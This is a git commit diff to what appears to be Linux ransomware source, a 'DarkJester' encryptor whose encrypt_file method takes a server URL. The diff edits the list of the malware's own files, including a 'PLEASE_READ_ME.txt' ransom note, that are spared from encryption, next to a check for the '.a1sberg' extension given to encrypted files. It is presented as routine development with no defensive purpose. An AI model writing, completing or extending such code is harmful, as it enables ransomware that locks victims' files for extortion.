3f80c3b2a81eda9f8690733985639b6490b1655f
KuroShiro <114529635+kUrOSH1R0oo@users.noreply.github.com>
2025-04-23 16:22:25 +0800

    Update darkjester_encryptor_specific_linux.py

--- darkjester_encryptor_specific_linux.py
+++ darkjester_encryptor_specific_linux.py
@@ -49,7 +49,7 @@ class DarkJester:
             
     def encrypt_file(self, filepath, server_url):
         try:
-            if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py"]:
+            if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_linux", "darkjester_encryptor_specific_linux.py", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_linux", "darkjester_encryptor_specific_linux.py"]:
                 return
             if filepath.endswith('.a1sberg'):
                 return
